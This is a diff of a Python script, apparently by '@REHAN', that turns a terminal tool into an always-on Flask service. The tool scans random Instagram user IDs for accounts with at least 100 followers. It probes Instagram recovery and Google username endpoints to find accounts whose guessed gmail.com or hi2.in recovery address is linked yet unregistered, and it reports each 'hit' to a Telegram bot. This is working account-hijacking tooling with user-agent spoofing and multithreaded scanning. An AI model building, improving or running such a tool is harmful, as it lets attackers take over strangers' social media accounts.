@@ -14,72 +14,37 @@ import urllib.parse
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
 from user_agent import generate_user_agent
+from flask import Flask
 
+app = Flask(__name__)
+
+# Render ke Environment variables se token uthayega
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
+CHAT_ID = os.environ.get("CHAT_ID", "")
 
 class RehanHere:
-
     def __init__(self):
         self.RED = "\033[1;31m"
         self.GREEN = "\033[1;32m"
         self.CYAN = "\033[1;36m"
         self.WHITE = "\033[1;37m"
-        self.BLUE = "\033[1;34m"
         self.YELLOW = "\033[1;33m"
-        self.MAGENTA = "\033[1;35m"
         self.RESET = "\033[0m"
 
-        self.TOKEN = ""
-        self.CHAT_ID = ""
-
+        self.TOKEN = BOT_TOKEN
+        self.CHAT_ID = CHAT_ID
         self.hits = 0
         self.good_ig = 0
         self.bad_insta = 0
         self.skipped = 0
-        self.current_email = "Waiting..."
-
-        # Minimum 100, Maximum 2000 (2000 se upar wale bhi skip nahi honge)
+        
         self.MIN_FOLLOWERS = 100
-        self.MAX_FOLLOWERS = 2000 
-
         self.reporter = None
         self.google = None
         self.insta = None
 
-    def _ui_clear(self):
-        os.system('cls' if os.name == 'nt' else 'clear')
-
-    def _ui_section(self, title):
-        return f"{self.MAGENTA}----------------------------------------------------------\n{self.WHITE}{title}{self.RESET}\n{self.MAGENTA}----------------------------------------------------------{self.RESET}\n"
-
-    def _ui_prompt(self, label):
-        return f"{self.YELLOW} {label.upper()} : {self.WHITE}"
-
-    def banner(self):
-        self._ui_clear()
-        pass
-
-    def setup(self):
-        print(self._ui_section(" 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 @𝗥𝗘𝗛𝗔𝗡 👑   𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀: 𝟭𝟬𝟬+ "))
-
-        self.TOKEN = input(self._ui_prompt("Bot token")).strip()
-        if not self.TOKEN: sys.exit()
-        self.CHAT_ID = input(self._ui_prompt("Chat ID")).strip()
-        if not self.CHAT_ID: sys.exit()
-
-        self._ui_clear()
-
     def display(self):
-        self._ui_clear()
-        print(f"""{self.MAGENTA}==========================================================
-{self.GREEN}  𝗛𝗜𝗧𝗦               : {self.WHITE}{self.hits}
-{self.YELLOW}  𝗚𝗢𝗢𝗗 𝗜𝗚           :  {self.WHITE}{self.good_ig}
-{self.BLUE}  𝗦𝗞𝗜𝗣𝗣𝗘𝗗           :  {self.WHITE}{self.skipped}
-{self.RED}  𝗕𝗔𝗗 𝗜𝗡𝗦𝗧𝗔         :  {self.WHITE}{self.bad_insta}
-{self.MAGENTA}----------------------------------------------------------
-{self.WHITE}  Checking: {self.YELLOW}{self.current_email}
-{self.MAGENTA}=========================================================={self.RESET}
-""")
-        sys.stdout.flush()
+        print(f"GOOD IG: {self.good_ig} | HITS: {self.hits} | SKIPPED: {self.skipped} | BAD: {self.bad_insta}", end="\r")
 
     class GoogleChecker:
         def __init__(self, outer):
@@ -96,7 +61,6 @@ class RehanHere:
                     n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
                     n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
                     host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))
-
                     headers = {"accept": "*/*", "accept-language": "en-US,en;q=0.9", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "google-accounts-xsrf": "1", "user-agent": self._generate_ua()}
                     res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=headers)
                     tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text)
@@ -123,9 +87,11 @@ class RehanHere:
                     tl, host = line.split('//')
             except:
                 time.sleep(3)
-                with open('tl.txt', 'r') as f:
-                    line = f.read().strip()
-                    tl, host = line.split('//')
+                try:
+                    with open('tl.txt', 'r') as f:
+                        line = f.read().strip()
+                        tl, host = line.split('//')
+                except: return 'bad'
 
             cookies = {'__Host-GAPS': host}
             headers = {'content-type': 'application/x-www-form-urlencoded;charset=UTF-8', 'google-accounts-xsrf': '1', 'origin': 'https://accounts.google.com', 'referer': f'https://accounts.google.com/signup/v2/createusername?TL={tl}', 'user-agent': generate_user_agent()}
@@ -237,7 +203,6 @@ class RehanHere:
     def process_user(self):
         while True:
             try:
-                # Purane IDs (2012-2016) se followers wale account dhoondhna
                 uid = random.randint(17750001, 4239516754)
                 username = self.insta.get_username_from_id(uid)
                 if not username:
@@ -245,21 +210,15 @@ class RehanHere:
                     self.display()
                     continue
                 
-                self.current_email = f"Checking @{username}..."
-                self.display()
-
-                # Followers Check (Minimum 100)
                 followers = self.insta.get_followers(username)
                 if followers < self.MIN_FOLLOWERS:
                     self.skipped += 1
                     self.display()
                     continue
 
-                # Ab dono platforms check karo
                 email_hi2 = f"{username}@hi2.in"
                 email_gmail = f"{username}@gmail.com"
                 
-                # 1. HI2 Check
                 res = self.insta.check_recovery(email_hi2)
                 if res == 'rate':
                     self.bad_insta += 1
@@ -277,10 +236,8 @@ class RehanHere:
                         msg = self.reporter.format_result(email_hi2, username, followers, "HI2")
                         self.reporter.save_to_file(msg)
                         self.reporter.send_telegram(msg)
-                        print(f"\n{GREEN}✓ HIT: {email_hi2} | Followers: {followers}{RESET}")
-                        continue # Agli ID pe jao
+                        continue
                 
-                # 2. GMAIL Check
                 res = self.insta.check_recovery(email_gmail)
                 if res is True:
                     self.good_ig += 1
@@ -291,7 +248,6 @@ class RehanHere:
                         msg = self.reporter.format_result(email_gmail, username, followers, "GMAIL")
                         self.reporter.save_to_file(msg)
                         self.reporter.send_telegram(msg)
-                        print(f"\n{GREEN}✓ HIT: {email_gmail} | Followers: {followers}{RESET}")
                 else:
                     self.bad_insta += 1
                     self.display()
@@ -302,25 +258,23 @@ class RehanHere:
                 time.sleep(random.uniform(1.0, 2.0))
 
     def run(self):
-        self.banner()
-        self.setup()
         self.reporter = self.ReportManager(self, self.TOKEN, self.CHAT_ID)
         self.google = self.GoogleChecker(self)
         self.insta = self.InstagramChecker(self)
 
-        self.display()
-
-        # 15 Threads
+        print("Bot Started Successfully!")
         with ThreadPoolExecutor(max_workers=15) as executor:
             for _ in range(15):
                 executor.submit(self.process_user)
 
-        try:
-            while True:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            print('\n[!] @REHAN - session ended.')
+        while True:
+            time.sleep(1)
 
+@app.route('/')
+def home():
+    return "Bot Online", 200
 
 if __name__ == "__main__":
-    RehanHere().run()
+    bot = RehanHere()
+    threading.Thread(target=bot.run, daemon=True).start()
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
